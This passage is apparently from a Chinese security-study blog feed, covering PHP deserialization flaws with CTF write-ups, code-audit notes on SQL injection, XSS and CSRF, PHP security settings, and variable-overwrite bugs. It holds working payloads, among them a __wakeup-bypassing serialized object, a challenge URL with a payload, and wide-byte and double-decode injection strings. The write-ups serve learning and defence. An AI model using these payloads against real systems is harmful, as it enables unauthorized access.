<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$test1_ser</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token delimiter">?></span></code></pre>
<p>运行结果：</p>
<pre class=" language-php"><code class="language-php">O<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"Test"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"flag"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"123"</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre>
<p>此处的<code>O</code>代表存储的是对象（object）。<code>4</code>表示对象的名称有4个字符。<code>&quot;Test&quot;</code>表示对象的名称。<code>1</code>表示有一个值。<code>s</code>表示字符串，<code>4</code>表示字符串长度，<code>&quot;flag&quot;</code>表示定义的变量名称。<code>123</code>表示变量的值。</p>
<h3 id="unserialize"><a href="#unserialize" class="headerlink" title="unserialize()"></a>unserialize()</h3><ul>
<li><strong>unserialize()</strong> 函数用于将通过 <a href="https://www.runoob.com/php/php-serialize-function.html" target="_blank" rel="noopener">serialize() </a>函数序列化后的对象或数组进行反序列化，并返回原始的对象结构。</li>
</ul>
<p>测试代码：</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">{</span>
    <span class="token keyword">var</span> <span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token string">'123'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token variable">$test1</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">;</span>
<span class="token variable">$test1_ser</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$test1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$test1_ser</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">echo</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>

<span class="token variable">$test2</span> <span class="token operator">=</span> <span class="token variable">$test1_ser</span><span class="token punctuation">;</span>
<span class="token variable">$test2_unser</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$test2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$test2_unser</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 

<span class="token delimiter">?></span></code></pre>
<p>结果：</p>
<pre class=" language-php"><code class="language-php">O<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"Test"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"flag"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"123"</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
Test <span class="token function">Object</span>
<span class="token punctuation">(</span>
    <span class="token punctuation">[</span>flag<span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token number">123</span>
<span class="token punctuation">)</span></code></pre>
<blockquote>
<p>当使用unserialize()函数时，将会调用__wakeup()成员函数</p>
</blockquote>
<h2 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a><font color="green">反序列化漏洞</font></h2><p>因为传入unserialize()函数的参数可控，我们可以通过传入恶意构造的字符串，从而控制对象内部的函数或者变量。</p>
<h3 id="魔法函数"><a href="#魔法函数" class="headerlink" title="魔法函数"></a>魔法函数</h3><p>在利用对PHP反序列化进行利用时，经常需要通过反序列化中的魔术方法，检查方法里有无敏感操作来进行利用。</p>
<p>常见的方法：</p>
<ul>
<li>__construct()：创建对象时自动调用</li>
<li>__destruct()：对象被销毁时自动调用</li>
<li>__wakeup()：unserialize()时自动调用</li>
<li>__call()：在对象上下文中调用不可访问的方法时触发</li>
<li>__sleep()：对象被序列化之前触发</li>
<li>__toString()：把类当作字符串使用时触发,返回值需要为字符串</li>
</ul>
<p>我们举个例子看看魔法函数在序列化和反序列化过程中如何调用的：</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>

<span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">{</span>
    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token string">"__construct"</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">__sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token string">"__sleep"</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token string">"__destruct"</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token variable">$test1</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">;</span>
<span class="token variable">$test1_ser</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$test1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$test1_unser</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$test1_ser</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$test1_unser</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  

<span class="token delimiter">?></span></code></pre>
<p>结果如下：</p>
<pre><code>__construct
__sleep
__destruct</code></pre><h3 id="属性权限"><a href="#属性权限" class="headerlink" title="属性权限"></a>属性权限</h3><p>类中的属性有三个权限：</p>
<ul>
<li><code>Public</code>权限</li>
<li><code>Private</code>权限</li>
<li><code>Protected</code>权限</li>
</ul>
<p>这三种权限的属性经过序列化后的字符长度不一样，字符的变化不同</p>
<ol>
<li><p>public权限</p>
<p><img src="https://s1.ax1x.com/2020/05/12/Ytt7d0.png" alt="image" style="zoom:80%;"><img src="https://s1.ax1x.com/2020/05/12/YttHoV.png" alt="iamge"></p>
<p>可以看到字符串长度没变，字符前后也没有变化</p>
</li>
<li><p>private权限</p>
<img src="https://s1.ax1x.com/2020/05/12/YttqiT.png" alt="image" style="zoom:80%;">

<p>发现字符串长度变成了10，而且字符串也变成<code>%00类名%00属性名</code>的形式</p>
</li>
<li><p>protected权限</p>
<p><img src="https://s1.ax1x.com/2020/05/12/YttHoV.png" alt="iamge"></p>
<p>发现字符串长度变成了7，而且字符串变成<code>%00*%00属性名</code>的形式</p>
</li>
</ol>
<h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a><font color="green">例子</font></h2><h3 id="ez-unserialize"><a href="#ez-unserialize" class="headerlink" title="ez_unserialize"></a>ez_unserialize</h3><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">include</span> <span class="token string">"flag.php"</span><span class="token punctuation">;</span>
<span class="token variable">$KEY</span> <span class="token operator">=</span> <span class="token string">"D0g3!!!"</span><span class="token punctuation">;</span>
<span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'str'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">"$KEY"</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token string">"$flag"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>我们构造payload：</p>
<p><code>http://120.79.33.253:9001/?str=s:7:%22D0g3!!!%22</code> 即可得到flag</p>
<h3 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h3><p>打开网站后提示备份，用dirsearch扫出来一个<a href="http://www.zip" target="_blank" rel="noopener">www.zip</a></p>
<p>下载后打开index.php发现一段代码：</p>
<pre class=" language-php"><code class="language-php">    <span class="token delimiter">&lt;?php</span>
    <span class="token keyword">include</span> <span class="token string">'class.php'</span><span class="token punctuation">;</span>
    <span class="token variable">$select</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'select'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$res</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span>@<span class="token variable">$select</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token delimiter">?></span></code></pre>
<p>再看class.php</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">include</span> <span class="token string">'flag.php'</span><span class="token punctuation">;</span>


<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


<span class="token keyword">class</span> <span class="token class-name">Name</span><span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string">'nonono'</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string">'yesyes'</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$password</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token string">'guest'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span> <span class="token operator">!=</span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">echo</span> <span class="token string">"&lt;/br>NO!!!hacker!!!&lt;/br>"</span><span class="token punctuation">;</span>
            <span class="token keyword">echo</span> <span class="token string">"You name is: "</span><span class="token punctuation">;</span>
            <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;/br>"</span><span class="token punctuation">;</span>
            <span class="token keyword">echo</span> <span class="token string">"You password is: "</span><span class="token punctuation">;</span>
            <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;/br>"</span><span class="token punctuation">;</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span> <span class="token operator">===</span> <span class="token string">'admin'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">global</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
            <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
            <span class="token keyword">echo</span> <span class="token string">"&lt;/br>hello my friend~~&lt;/br>sorry i can't give you the flag!"</span><span class="token punctuation">;</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token delimiter">?></span></code></pre>
<p>所以我们要让password=100，且username=admin，并用序列化传进去即可得到flag</p>
<p>构造一下：</p>
<pre class=" language-php"><code class="language-php">O<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"Name"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token string">"Nameusername"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string">"admin"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token string">"Namepassword"</span><span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token number">100</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre>
<p>但我们还需要绕过__wakeup() 和 __destruct()</p>
<p>在反序列化字符串时，属性个数的值大于实际属性个数时，会跳过 __wakeup()函数的执行</p>
<p>所以构造出：</p>
<pre class=" language-php"><code class="language-php">O<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"Name"</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token string">"Nameusername"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string">"admin"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token string">"Namepassword"</span><span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token number">100</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre>
<p>不过变量是private型，该类私有字段的字段名在序列化时，类名和字段名前面都会加上\0</p>
<p>最后构造：</p>
<pre class=" language-php"><code class="language-php">O<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"Name"</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token string">"%00Name%00username"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string">"admin"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token string">"%00Name%00password"</span><span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token number">100</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre>
<p>payload:</p>
<p><code>select={s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;}</code></p>
]]></content>
      <categories>
        <category>反序列化</category>
        <category>CTF</category>
        <category>代码审计</category>
        <category>漏洞挖掘</category>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>漏洞挖掘</tag>
        <tag>反序列化</tag>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>代码审计学习（二）</title>
    <url>/2019/11/03/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    <content><![CDATA[<h2 id="代码审计学习（二）"><a href="#代码审计学习（二）" class="headerlink" title="代码审计学习（二）"></a>代码审计学习（二）</h2><h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a><font color="green">SQL注入</font></h3><ul>
<li><strong>由于开发者在编写数据库代码时，直接将外部可控的参数拼接到SQL语句中，没有经过任何过滤就直接放入数据库引擎执行</strong></li>
</ul>
<a id="more"></a>

<hr>
<h4 id="普通注入"><a href="#普通注入" class="headerlink" title="普通注入"></a>普通注入</h4><ul>
<li>在<strong>参数处</strong>利用select、union等构造sql注入语句。主要分为<strong>int型</strong>和<strong>string型注入</strong></li>
</ul>
<pre><code>string型注入中需要用单或双引号闭合</code></pre><ul>
<li><strong>关键函数</strong><pre><code>select、mysql_connect、mysql_query、mysql_fetch_now
update 、insert、 delete等</code></pre></li>
</ul>
<hr>
<h4 id="编码注入"><a href="#编码注入" class="headerlink" title="编码注入"></a>编码注入</h4><p><font color="purple"><strong>1. 宽字节注入</strong></font></p>
<ul>
<li>漏洞产生原因：<br>```</li>
</ul>
<ol>
<li>set character_set_client = ‘gbk’</li>
<li>SET NAMES ‘gbk’<br>```</li>
</ol>
<ul>
<li>漏洞利用：<strong>当注入参数里带入%df%27，即可把过滤的(\)%5c吃掉</strong></li>
</ul>
<blockquote>
<p>%df%5c -&gt; 運</p>
</blockquote>
<ul>
<li>合理使用mysql_real_escape_string可解决这个漏洞</li>
</ul>
<ul>
<li>关键函数：<pre><code>SET NAMES
character_set_clint=gbk
mysql_set_charset(&#39;gbk&#39;)</code></pre></li>
</ul>
<hr>
<p><font color="purple"><strong>2. 二次urldecode注入</strong></font></p>
<ul>
<li><p>漏洞原因：当提交参数到web服务器时，<strong>会先自动解码一次</strong>。若<font color="red">程序里</font>使用了<strong>urldecode或者rawurldecode函数</strong>来解码参数，则会出现二次注入漏洞</p>
</li>
<li><p>漏洞利用：参数里带入%2527</p>
</li>
</ul>
<blockquote>
<p>%2527 二次解码后-&gt; ‘</p>
</blockquote>
<ul>
<li>关键函数：</li>
</ul>
<pre><code>urldecode
rawurldecode</code></pre><hr>
<h4 id="防范"><a href="#防范" class="headerlink" title="防范"></a>防范</h4><p><strong>1. magic_quotes_gpc/runtime魔术引导</strong></p>
<p><strong>2. 过滤函数和类</strong></p>
<pre><code>addslashes()
mysql_escape_string() / mysql_real_escape_string()
intval()</code></pre><p><strong>3. PDO prepare 预编译</strong></p>
<hr>
<h3 id="XSS漏洞"><a href="#XSS漏洞" class="headerlink" title="XSS漏洞"></a><font color="green">XSS漏洞</font></h3><ul>
<li><strong>通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序</strong></li>
</ul>
<hr>
<h4 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h4><ul>
<li>定义：<strong>直接通过外部输入然后在浏览器输出端触发</strong></li>
</ul>
<pre><code>在白盒审计中，只需要寻找带有参数的输出函数
然后根据输出函数内容回溯输入参数，观察是否有过滤</code></pre><hr>
<h4 id="储存型XSS"><a href="#储存型XSS" class="headerlink" title="储存型XSS"></a>储存型XSS</h4><ul>
<li>定义：<strong>需要先把利用代码保存在比如数据库或者文件中，当WEB程序读取利用代码并输出在页面上时执行利用代码</strong></li>
</ul>
<pre><code>同样要寻找为过滤的输入与输出点</code></pre><hr>
<h4 id="漏洞防范"><a href="#漏洞防范" class="headerlink" title="漏洞防范"></a>漏洞防范</h4><p><font color="purple"><strong>1. 特殊字符HTML实体转码</strong></font></p>
<ul>
<li>一般的XSS漏洞都是因为没过滤特殊字符，导致可以通过注入单引号以及尖括号等字符利用漏洞</li>
</ul>
<ul>
<li>常见特殊字符：<br>```</li>
</ul>
<ol>
<li>单引号(‘)</li>
<li>双引号(“)</li>
<li>尖括号(&lt; &gt;)</li>
<li>反斜杠()</li>
<li>冒号(:)</li>
<li>and(&amp;)</li>
<li>#<pre><code>建议在输出和二次调用时进行如HTML实体一类的转码
</code></pre></li>
</ol>
<p><font color="purple"><strong>2. 标签事件属性黑名单</strong></font></p>
<pre><code>用黑名单过滤
用正则匹配白名单</code></pre><hr>
<h3 id="CSRF漏洞"><a href="#CSRF漏洞" class="headerlink" title="CSRF漏洞"></a><font color="green">CSRF漏洞</font></h3><ul>
<li>定义：<strong>跨站请求伪造。劫持其他用户去进行一些危险请求</strong></li>
</ul>
<pre><code>白盒审计中，看核心文件中有没有验证token和referer相关的代码</code></pre><hr>
<h4 id="漏洞防范："><a href="#漏洞防范：" class="headerlink" title="漏洞防范："></a>漏洞防范：</h4><p><font color="purple"><strong>1. token/referer验证</strong></font></p>
<p><font color="purple"><strong>2. 验证码验证</strong></font></p>
]]></content>
      <categories>
        <category>WEB安全</category>
        <category>CTF</category>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>WEB安全</tag>
        <tag>漏洞挖掘</tag>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>代码审计学习（一）</title>
    <url>/2019/11/02/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80)/</url>
    <content><![CDATA[<h2 id="代码审计学习（一）"><a href="#代码审计学习（一）" class="headerlink" title="代码审计学习（一）"></a>代码审计学习（一）</h2><h3 id="PHP核心配置"><a href="#PHP核心配置" class="headerlink" title="PHP核心配置"></a>PHP核心配置</h3><p><font color="green"><strong>首先需了解 PHP_INI_* 常量的定义</strong></font></p>
<a id="more"></a>

<table>
<thead>
<tr>
<th>常量</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>PHP_INI_USER</td>
<td>可在用户的php脚本或者windows注册表中设置</td>
</tr>
<tr>
<td>PHP_INI_PERDIR</td>
<td>可在php.ini .htaccess或http.conf中设置</td>
</tr>
<tr>
<td>PHP_INI_SYSTEM</td>
<td>可在php.ini 或 http.conf中配置</td>
</tr>
<tr>
<td>PHP_INI_ALL</td>
<td>可在任何地方配置</td>
</tr>
<tr>
<td>PHP.ini only</td>
<td>可仅在php.ini中配置</td>
</tr>
</tbody></table>
<hr>
<ul>
<li><strong>常见影响安全的配置</strong></li>
</ul>
<p><font color="green"><strong>1. register_globals(全局注册变量)：</strong></font><br>    <strong>若为on</strong>，会直接把用户通过GET、POST传进来的参数<strong>注册为全局变量并初始化参数对应的值</strong></p>
<pre><code> 仅在php版本低于5.4.0时可用 </code></pre><p><font color="green"><strong>2. allow_url_include(是否运行包含远程文件)：</strong></font><br>    <strong>若为on，可以直接包含远程文件</strong>。当变量可控时，可用来构造php代码。   </p>
<pre><code>allow_url_include在 PHP 5.2.0后默认为off，配置范围是PHP_INI_ALL</code></pre><p><font color="green"><strong>3. magic_quotes_gpc(魔术引号自动过滤)：</strong></font><br>    <strong>若为on</strong>，会自动在GET、POST、COOKIE到的变量中的<strong>单引号（’)、双引号(“)、反斜杠(\)及空白字符（NULL)前加上反斜杠(\)</strong>。但是在PHP5中的magic_quotes_gpc并<strong>不会过滤</strong><font color="red">$_SERVER变量</font>，导致很多漏洞</p>
<pre><code>在PHP5.4之前可用。小于4.2.3时配置范围是PHP_INI_ALL;大于时是PHP_INI_PERDIR</code></pre><p><font color="green"><strong>4. magic_quotes_runtime(魔术引号自动过滤)：</strong></font><br>    与magic_quotes_gpc概念差不多，但处理对象不同。<strong>只处理从数据库或者文件中获取的数据</strong>。</p>
<pre><code>只有部分函数受影响，大多为读取数据库或文件的函数</code></pre><p><font color="green"><strong>5. magic_quotes_sybase(魔术引号自动过滤)：</strong></font><br>    用于自动过滤字符。<strong>当为on，会覆盖掉magic_quotes_gpc=on的配置</strong>。处理对象与gpc一致，但处理方式仅仅为转义空字符与把 ‘ 变成 “</p>
<pre><code>PHP 5.4.0前可用，配置范围为PHP_INI_ALL</code></pre><p><font color="green"><strong>6. safe_mode(安全模式)：</strong></font><br>    PHP内嵌的安全机制。当为on时，可用的指令为 <strong>safe_mode_include_dir</strong>、<strong>safe_mode_exec_dir</strong>、<strong>safe_mode_allow_env_vars</strong>、<strong>safe_mode_protected_env_vars</strong></p>
<pre><code>safe_mode指令的配置范围为PHP_INI_SYSTEM PHP5.4之后被取消

所有文件操作函数会受限制（file()、include()..)

通过函数popen()、system()、exec()执行命令或程序会报错</code></pre><p><font color="green"><strong>7. open_basedir：</strong></font><br>    open_basedir指令用来<strong>限制PHP只能访问哪些目录</strong></p>
<pre><code>指定的限制是前缀不是文件名

小于 PHP5.2.3时是PHP_INI_SYSTEM，大于时是PHP_INI_ALL</code></pre><p><font color="green"><strong>8. disable_functions(禁用函数)：</strong></font><br>    <strong>禁止敏感函数的使用</strong></p>
<pre><code>记得把dl()禁掉 否则可利用dl()绕过

配置范围为php.ini only</code></pre><hr>
<h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><ul>
<li>编辑器：<strong>sublime text</strong>、UltraEdit</li>
<li>审计工具：<strong>Seay源码审计系统</strong>、RIPS</li>
<li>漏洞验证工具：<strong>burp</strong>、Firebug、</li>
<li>辅助工具：编码转换工具、正则调试工具等</li>
</ul>
<hr>
<h3 id="代码审计思路"><a href="#代码审计思路" class="headerlink" title="代码审计思路"></a>代码审计思路</h3><p><font color="red"><strong>1. 根据敏感关键字回溯参数传递过程</strong></font></p>
<p><font color="green"><strong>2. 查看可控变量，正向追踪变量传递过程</strong></font></p>
<p><font color="lightblue"><strong>3. 寻找敏感功能点，通读功能点代码</strong></font></p>
<p><strong>4. 直接通读全文代码</strong></p>
<hr>
]]></content>
      <categories>
        <category>WEB安全</category>
        <category>CTF</category>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>WEB安全</tag>
        <tag>漏洞挖掘</tag>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>变量覆盖漏洞学习</title>
    <url>/2019/10/27/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h2 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a><font color="green">定义</font></h3><ul>
<li>可以用<strong>自定义的参数值</strong><font color="red">替换</font><strong>原有变量值</strong>的情况称为变量覆盖漏洞</li>
</ul>
<a id="more"></a>

<h3 id="主要情形"><a href="#主要情形" class="headerlink" title="主要情形"></a><font color="green">主要情形</font></h3><ul>
<li><strong>$$使用不当</strong></li>
<li><strong>extract()函数使用不当</strong></li>
<li><strong>parse_str()函数使用不当</strong></li>
<li>import_request_variables()使用不当</li>
<li>开启全局变量注册</li>
<li>……</li>
</ul>
<hr>
<h4 id="使用不当"><a href="#使用不当" class="headerlink" title="$$使用不当"></a>$$使用不当</h4><p><strong>1. 定义</strong></p>
<ul>
<li>一个<strong>可变变量</strong>获取了一个普通变量的值作为这个可变变量的变量名。</li>
</ul>
<p><strong>2. 漏洞产生</strong></p>
<ul>
<li>使用<font color="red">foreach</font>来<strong>遍历数组中的值，然后再将获取到的数组键名作为变量，数组中的键值作为变量的值</strong>。因此就产生了变量覆盖漏洞。</li>
</ul>
<pre><code>&lt;?php
foreach ($_GET as $key =&gt; $value) {
${$key} = $value;
}
echo $a;
?&gt;</code></pre><p>如上代码，把<strong>GET得到的$key</strong>作为<strong>新变量的变量名</strong>，<strong>把GET得到的$value</strong>赋值给它</p>
<p>GET ?a=1 第3行回解析为$a=1。就造成了变量覆盖</p>
<pre><code>//例题
&lt;!--foreach($_GET as $key =&gt; $value){  
        $$key = $value;  
}  
if($name == &quot;meizijiu233&quot;){
    echo $flag;
}--&gt;</code></pre><p>poc:<br><code>?name = meizijiu233</code></p>
<hr>
<h4 id="extract-使用不当"><a href="#extract-使用不当" class="headerlink" title="extract()使用不当"></a>extract()使用不当</h4><p><strong>1. 定义</strong></p>
<ul>
<li>extract() 函数从数组中将变量导入到当前的符号表。</li>
</ul>
<ul>
<li>该函数使用<strong>数组键名</strong>作为<strong>变量名</strong>，使用<font color="green">数组键值</font>作为<font color="green">变量值</font>。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。<strong>该函数返回成功设置的变量数目</strong>。</li>
</ul>
<p><strong>2. 语法</strong></p>
<pre><code>extract(array,extract_rules,prefix)</code></pre><table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>array</td>
<td>必需。规定要使用的数组。</td>
</tr>
<tr>
<td>extract_rules</td>
<td>可选。extract() 函数将检查每个键名是否为合法的变量名，同时也检查和符号表中已存在的变量名是否冲突。对不合法和冲突的键名的处理将根据此参数决定。</td>
</tr>
<tr>
<td>prefix</td>
